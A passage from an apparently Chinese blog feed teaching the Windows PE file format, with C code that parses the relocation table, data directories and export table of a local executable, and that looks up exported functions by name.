class="hljs-string">&quot;RVA_Address:%X FOA_Address:%X\n&quot;</span>,RVA,RVA_TO_FOA(RVA,Buffer));<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//根据SizeOfBlock找到下一个重定位表块，同样也是需要先转为byte*再计算</span><br>        Relocation_Table = (PIMAGE_BASE_RELOCATION) (((byte*)(Relocation_Table) + Relocation_Table-&gt;SizeOfBlock));<br>    &#125;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_Info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <br>    <span class="hljs-comment">//将文件读取到程序中</span><br>    <span class="hljs-type">int</span> size = Size(fp);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp);<br><br>    Relocation_INFO(buffer);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里贴上我的代码运行部分截图</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307090031836.png"></p><p>与前面的进行对比，会发现RVA_Address加上实际ImageBase 0x10000后就是需要重定位的地址啦。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307082351108.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（七）</title>
    <link href="/2023/07/07/PE_6/"/>
    <url>/2023/07/07/PE_6/</url>
    
    <content type="html"><![CDATA[<p>导出表</p><span id="more"></span><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>目前我们已经完成对PE基本结构的解析，了解PE各个头的主要成员，并基于对这些头的理解，对PE文件进行一些改动。如果完成之前的练习，相信你一定对PE文件头的组成已经有了深刻的认识，而且对于C语言指针的理解也一定深入一个层次（：</p><p>然而PE文件最为复杂结构还没有真正现身，即重定位表、导入表、导出表，这三张表比之前所有的加起来都还要复杂，它们也是PE文件能够正常运行的关键所在，接下来就慢慢深入探究吧</p><h2 id="知识铺垫"><a href="#知识铺垫" class="headerlink" title="知识铺垫"></a>知识铺垫</h2><p>在学习这几张表之前还需要一些个知识的铺垫</p><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><p>当我们在写程序的时候，总会面临代码复用的问题，常见的解决办法是将相关函数进行一个封装单独放在一个文件里面，然后再在主工程里面使用一个头文件include进来</p><p>![](C:\Users\yongrin\Desktop\截屏2023-07-06 14.42.05.png)</p><p>那么这个时候会一个问题，就是别人也想用这个代码，或者其他工程也想用这些代码怎么办呢，可能会想说那我直接复制一份不就好了嘛。但显然这样不够优雅，有没有一种方式可以打包这些代码，然后其他程序直接使用呢？</p><p>答案当然是可以的，就是把这些代码打包成一个lib文件，具体操作可以看<a href="https://blog.csdn.net/nnKevi/article/details/122552542">这篇文章</a>。这里是使用DevC++创建的lib文件，当然也可以使用其他编译工具，但是我觉得DevC++是比较方便的。</p><p>这样就可以很方便的复用代码，并且别人也可以使用啦</p><h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p>那静态链接可以如此方便的复用代码，有没有什么问题呢？比如说发现在lib文件里有一个函数写错了，这时候就不得不重新编译一个lib文件，然后对使用的此lib的程序都需要重新编译，这个在大的工程里面的还是代价还是很大的。</p><p>因为静态链接就相当于把lib文件里的函数一股脑全部怼进工程里面，与自己复制代码得到的程序没什么两样，编译完成后里面的函数就不会发生变化。这也是称其为静态链接的原因，也是因为不会发生变化，所以整个程序都需要重新编译。</p><p>那么有没有一种做法可以在不更改工程的同时，对其使用到的函数进行修正呢？动态链接就是解决此问题的，可以参考<a href="https://blog.csdn.net/L_Mu2000/article/details/115418810">这篇文章</a>制作一个动态链接库并导出其中函数使用。</p><h3 id="IMAGE-DATA-DIRECTORY"><a href="#IMAGE-DATA-DIRECTORY" class="headerlink" title="IMAGE_DATA_DIRECTORY"></a>IMAGE_DATA_DIRECTORY</h3><p>可选头的最后一个成员是一个结构体数组，这个数组存储了各种表的的地址，包括导出表、导入表、重定位表等。每一个结构体都是相同的，包含两个成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DATA_DIRECTORY</span> &#123;</span><br>DWORD　VirtualAddress; <span class="hljs-comment">//相对虚拟地址</span><br>DWORD　Size;　　　　　 <span class="hljs-comment">//大小</span><br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br></code></pre></td></tr></table></figure><p>第一个成员就是该表的地址，第二个成员就该表的大小，但实际上每一张表都有自己统计大小的方法，这个Size字段没有用处，可以被任意修改。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307071826259.jpg"></p><p>可以使用以下代码遍历整个结构体数组，并得到每一个表的RVA</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    <span class="hljs-type">int</span> size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Data_Directoy</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span><br>&#123;<br>PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS32 NTHeader = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//这里用了PIMAGE_NT_HEADERS32 对应于32位文件，必须使用</span><br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br><br>    DWORD* Data_Directory = (DWORD*)OptionalHeader-&gt;DataDirectory;<br>    <span class="hljs-type">int</span> number = OptionalHeader-&gt;NumberOfRvaAndSizes;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EXPORT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IMPORT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">2</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RESOURCE Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">3</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EXCEPTION Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">4</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SECURITY Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">5</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;BASERELOC Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">6</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DEBUG Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">7</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;COPYRIGHT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">8</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;GLOBALPTR Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">9</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TLS Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">10</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LOAD_CONFIG Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i ==<span class="hljs-number">11</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;BOUND_IMPORT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">12</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IAT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">13</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DELAY_IMPORT Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">14</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;COM_DESCRIPTOR Directory:\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">15</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reserved Directory:\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RVA: %X\nSize: %X\n=====================&quot;</span>, *(Data_Directory + <span class="hljs-number">2</span> * i), *(Data_Directory + <span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <br>    <span class="hljs-comment">//将文件读取到程序中</span><br>    <span class="hljs-type">int</span> size = Size(fp);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp);<br><br>    Data_Directoy(buffer);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><h3 id="什么是导出表"><a href="#什么是导出表" class="headerlink" title="什么是导出表"></a>什么是导出表</h3><p>一个exe中，可能会动态链接一些库，那么这些库就得告诉别的exe有什么函数可以供其使用，要告知别的exe这些函数相关信息，比如名字、地址等等，因此就需要一张表来记录这些信息，就相当于是一个指南，告诉别人我能提供什么函数，你可以怎样找到这些函数。IMAGE_DATA_DIRECTORY的第一个成员指向的就是导出表。</p><p>然而要注意的是，并不是DLL才有导出表，exe同样也可以有导出表，它也能提供函数给别的exe使用</p><h3 id="导出表结构"><a href="#导出表结构" class="headerlink" title="导出表结构"></a>导出表结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br>        DWORD   Characteristics;<span class="hljs-comment">//没用</span><br>        DWORD   TimeDateStamp;<span class="hljs-comment">//时间戳</span><br>        WORD    MajorVersion;<span class="hljs-comment">//没用</span><br>        WORD    MinorVersion;<span class="hljs-comment">//没用</span><br>        DWORD   Name;<span class="hljs-comment">//指向导出表文件名 RVA --&gt;FOA+FileBuff=char *name;</span><br>        DWORD   Base;<span class="hljs-comment">//导出函数起始序号</span><br>        DWORD   NumberOfFunctions;<span class="hljs-comment">//导出函数个数</span><br>        DWORD   NumberOfNames;<span class="hljs-comment">//以名称导出函数个数</span><br>        DWORD   AddressOfFunctions;<span class="hljs-comment">//导出函数地址表 RVA--&gt;FOA +FileBuff         </span><br>DWORD   AddressOfNames;    <span class="hljs-comment">//导出函数名称表     // RVA from base of image</span><br>        DWORD   AddressOfNameOrdinals; <span class="hljs-comment">//导出函数序号表 // RVA from base of image</span><br>&#125; IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY;<br></code></pre></td></tr></table></figure><ul><li><p>Name 存储指向自己文件名字的地址，是一个RVA</p></li><li><p>Base</p><p>在创造dll的过程中，我们可以使用def文件来手动决定导出函数序号</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307072055509.png"></p><p>其中里面最小的那个序号就是Base。这里面的序号也可以是随意的无序的，序号后面，也可以再加一个NONAME，那么这个函数在导出的时候就不会有名字，只能通过序号来使用它。</p></li><li><p>NumberOfFunctions 导出函数个数，是指所有函数的个数，包括使用无名函数导出的</p></li><li><p>NumberOfNames 以名字导出函数个数</p></li><li><p>AddressOfFunctions：存储一个RVA地址，指向一张存有所有函数地址的表，个数由NumberOfFunctions决定，以下称为地址表</p></li><li><p>AddressOfNames：存储一个RVA地址，指向一张存有所有函数名字地址的表，个数由NumberOfNames 决定，以下称为名称地址表</p></li><li><p>AddressOfNameOrdinals：存储一个地址，指向一张存有所有函数序号的表，个数与AddressOfNames相同，以下称为序号表</p></li></ul><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307072016159.png"></p><p>NOTE：</p><ul><li><p>NumberOfFunctions计算方式。之前提及，在使用def导出函数序号时，我们可以随意决定函数序号，而NumberOfFunctions就依赖这些序号计算。具体地，它会用<strong>最大的序号 - 最小的序号 + 1</strong>这个公式来计算。也就是说，NumberOfFunctions并不一定就是实际导出函数个数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307072233229.jpg"></p></li><li><p>地址表与名称地址表大小不一定。通常情况下地址表会大于名称地址表，因为地址表是由所有函数地址，名称表只是以名字导出的函数。但也是也可以让两个函数名字指向同一个函数，这种情况下名称地址表就有可能大于地址表</p></li><li><p>在导出函数的时候可以通过使用def文件的方式更改dll函数导出序号，但是def里的序号与序号表里序号并不是一样的，而是序号表的序号 &#x3D; def的序号 + base</p></li><li><p>使用名字找一个函数流程。现在要找一个名为“ADD”的函数，其流程如下</p><ul><li>遍历名称地址表，从中一个一个比对，找到对应的函数，得到名称地址表的索引</li><li>使用相同索引在序号表里得到序号</li><li>以得到的序号为索引，在地址表里得到函数地址</li></ul></li><li><p>使用序号找一个函数流程。现在要找一个序号10的函数，其流程如下</p><ul><li>直接用序号减base得到索引</li><li>使用索引在地址表里得到函数地址</li></ul></li></ul><h3 id="遍历导出表"><a href="#遍历导出表" class="headerlink" title="遍历导出表"></a>遍历导出表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span> <span class="hljs-title function_">Export_Table</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Characteristics: %#x\n&quot;</span>, _Export_Table-&gt;Characteristics);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TimeDateStamp: %#x\n&quot;</span>, _Export_Table-&gt;TimeDateStamp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MajorVersion: %#x\n&quot;</span>, _Export_Table-&gt;MajorVersion);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MinorVersion: %#x\n&quot;</span>, _Export_Table-&gt;MinorVersion);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name: %s\n&quot;</span>, (Buffer + RVA_TO_FOA(_Export_Table-&gt;Name, Buffer)));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base: %#x\n&quot;</span>, _Export_Table-&gt;Base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NumberOfFunctions: %#x\n&quot;</span>, _Export_Table-&gt;NumberOfFunctions);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NumberOfNames: %#x\n&quot;</span>, _Export_Table-&gt;NumberOfNames);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfFunctions: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfFunctions);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfNames: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfNames);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AddressOfNameOrdinals: %#x\n&quot;</span>, _Export_Table-&gt;AddressOfNameOrdinals);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========函数地址表 AddressOfFuncitons==========\n&quot;</span>);<br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfFunctions;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;下标：%d 函数地址：%x\n&quot;</span>, i , *(AddressOfFuncitons + i));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========序号表 AddressOfOrdinals==========\n&quot;</span>);<br>    WORD* AddressOfOrdinals = (WORD*)(Buffer +  RVA_TO_FOA(_Export_Table-&gt;AddressOfNameOrdinals,Buffer));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames; i++)<br>    &#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;下标：%d 序号：%x\n&quot;</span>, i , *(AddressOfOrdinals + i));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==========函数名称表 AddressOfNames==========\n&quot;</span>);<br>    DWORD* AddressOfNames = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfNames,Buffer));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames;i++)&#123;<br>        <span class="hljs-type">char</span>* nameaddres = Buffer + RVA_TO_FOA(*(AddressOfNames + i),Buffer);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;下标：%d 函数名称：%s\n&quot;</span>, i ,nameaddres);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="根据函数名称找函数"><a href="#根据函数名称找函数" class="headerlink" title="根据函数名称找函数"></a>根据函数名称找函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">GetFuncAddrByName</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer,<span class="hljs-type">char</span>* name)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>    FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD Export_Table_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br><br>    <span class="hljs-keyword">if</span>(Export_Table_RVA == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This PE File Has Not Export Table!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    DWORD Export_Table_FOA = RVA_TO_FOA(Export_Table_RVA,Buffer);<br>    PIMAGE_EXPORT_DIRECTORY _Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Buffer + Export_Table_FOA);<br>    <br>    <span class="hljs-comment">//函数地址表</span><br>    DWORD* AddressOfFuncitons = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfFunctions,Buffer));<br>    <span class="hljs-comment">//序号表</span><br>    WORD* AddressOfOrdinals = (WORD*)(Buffer +  RVA_TO_FOA(_Export_Table-&gt;AddressOfNameOrdinals,Buffer));<br>    <span class="hljs-comment">//函数名称表</span><br>    DWORD* AddressOfNames = (DWORD*)(Buffer + RVA_TO_FOA(_Export_Table-&gt;AddressOfNames,Buffer));<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _Export_Table-&gt;NumberOfNames;i++)&#123;<br>        <span class="hljs-type">char</span>* nameaddr = Buffer + RVA_TO_FOA(*(AddressOfNames + i),Buffer);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(name,nameaddr))&#123;<br>            <span class="hljs-type">int</span> ordinal = *(AddressOfOrdinals + i);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s found: 